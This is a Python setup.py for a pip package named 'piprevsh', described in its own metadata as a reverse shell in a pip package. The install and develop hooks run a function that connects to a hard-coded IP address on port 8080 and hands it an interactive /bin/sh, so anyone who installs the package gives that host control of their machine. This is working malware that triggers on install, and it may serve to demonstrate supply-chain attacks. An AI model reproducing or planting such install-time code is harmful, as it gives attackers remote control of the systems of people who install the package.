#!/usr/bin/env python

from __future__ import print_function

import socket,subprocess,os

from setuptools import setup
from setuptools.command.develop import develop
from setuptools.command.install import install


def revsh():
    import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("54.184.144.122",8080))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"]);


class PostDevelopCommand(develop):
    def run(self):
        revsh()
        develop.run(self)


class PostInstallCommand(install):
    def run(self):
        revsh()
        install.run(self)


setup(
    name='piprevsh',
    version='0.0.1',
    description='Reverse shell in pip package',
    long_description='Reverse shell in pip package',
    long_description_content_type='text/markdown',
    url='https://github.com/oliverjensen-wk/piprevsh',
    packages=[],
    license='GPLv3',
    classifiers=[],
    install_requires=[],
    tests_require=[],
    cmdclass={
        'develop': PostDevelopCommand,
        'install': PostInstallCommand,
    },
)
